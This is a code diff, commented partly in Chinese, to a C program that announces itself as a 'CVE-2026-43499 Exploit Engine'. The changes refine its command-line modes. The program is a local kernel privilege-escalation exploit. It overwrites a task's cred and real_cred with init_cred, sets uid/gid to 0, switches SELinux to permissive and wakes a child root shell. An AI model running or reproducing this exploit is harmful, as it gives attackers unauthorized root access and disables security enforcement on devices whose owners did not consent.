@@ -710,19 +710,17 @@ int main(int argc, char **argv) {
   __orig_stdout = dup(STDOUT_FILENO);
   process_pid = getpid();
 
-  int module_given = 0;
   for (int i = 1; i < argc; i++) {
     if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
       usage(argv[0]);
       return 0;
     } else if (strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--module") == 0) {
-      if (i + 1 >= argc || argv[i + 1][0] == '-') {
+      if (i + 1 >= argc || argv[i + 1][0] == '\0' || argv[i + 1][0] == '-') {
         pr_warning("missing value for %s\n", argv[i]);
         usage(argv[0]);
         return 2;
       }
       snprintf(g_module_path, sizeof(g_module_path), "%s", argv[++i]);
-      module_given = 1;
     } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--shell") == 0) {
       g_shell_mode = 1;
     } else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--force") == 0) {
@@ -740,19 +738,22 @@ int main(int argc, char **argv) {
     }
   }
 
-  if (g_shell_mode && g_permissive_only) {
-    pr_warning("-s/--shell and -p/--permissive-only are mutually exclusive\n");
+  /* 四种运行模式互斥：--shell / --permissive-only / --leak-only / --leak-y-only */
+  int mode_count = g_shell_mode + g_permissive_only + g_leak_only + y_leak_only;
+  if (mode_count > 1) {
+    pr_warning("conflicting modes: --shell / --permissive-only / --leak-only / "
+               "--leak-y-only are mutually exclusive\n");
+    usage(argv[0]);
+    return 2;
+  }
+  /* -f 只对默认模式（会释放文件）有意义 */
+  if (g_force_release && mode_count > 0) {
+    pr_warning("-f/--force has no effect with --shell/--permissive-only/--leak-only/--leak-y-only\n");
     usage(argv[0]);
     return 2;
   }
 
   /* 参数校验失败时只打印帮助、不执行 exploit */
-  if (!g_shell_mode && !g_permissive_only && module_given && access(g_module_path, F_OK) != 0) {
-    pr_warning("module file not found: %s\n", g_module_path);
-    usage(argv[0]);
-    return 2;
-  }
-
   timer_reset();
   pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
   pr_info("Target PID: %d | UID: %d | GID: %d\n", getpid(), getuid(), getgid());
@@ -969,14 +970,16 @@ int main(int argc, char **argv) {
   pr_success("SELinux write_trigger=%d enforce=%d->%d\n", wr, before, after);
   if (after == 0) pr_success("SELinux permissive verified\n");
 
-  if (!write_value(child_task + 0x808, k_init_cred)) { pr_error("child cred -> init_cred failed\n"); }
-  pr_success("Child task->cred -> init_cred\n");
+  if (!g_permissive_only) {
+    if (!write_value(child_task + 0x808, k_init_cred)) { pr_error("child cred -> init_cred failed\n"); }
+    pr_success("Child task->cred -> init_cred\n");
 
-  if (!write_value(child_task + 0x800, k_init_cred)) { pr_error("child real_cred -> init_cred failed\n"); }
-  pr_success("Child task->real_cred -> init_cred\n");
+    if (!write_value(child_task + 0x800, k_init_cred)) { pr_error("child real_cred -> init_cred failed\n"); }
+    pr_success("Child task->real_cred -> init_cred\n");
 
-  if (!write_value(k_init_cred + 0x04, 0)) { pr_error("init_cred uid/gid repair failed\n"); }
-  pr_success("init_cred uid/gid repaired to 0\n");
+    if (!write_value(k_init_cred + 0x04, 0)) { pr_error("init_cred uid/gid repair failed\n"); }
+    pr_success("init_cred uid/gid repaired to 0\n");
+  }
 
   TIMER("Exploit complete, waking child shell");
   __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
@@ -994,10 +997,10 @@ int main(int argc, char **argv) {
       pr_warning("[PARENT] waitpid(%d) failed: %s\n",
                  (int)child_pid, strerror(errno));
   } else if (wp == child_pid && g_permissive_only) {
-      if (WIFEXITED(cstatus) && WEXITSTATUS(cstatus) == 0) {
+      if (after == 0) {
           pr_success("[KSU] SELinux is permissive now (permissive-only mode)\n");
       } else {
-          pr_warning("[KSU] permissive-only failed (status=0x%x)\n", cstatus);
+          pr_warning("[KSU] permissive-only failed (enforce read=%d)\n", after);
       }
   } else if (!g_shell_mode && wp == child_pid) {
       int load_failed = 0;
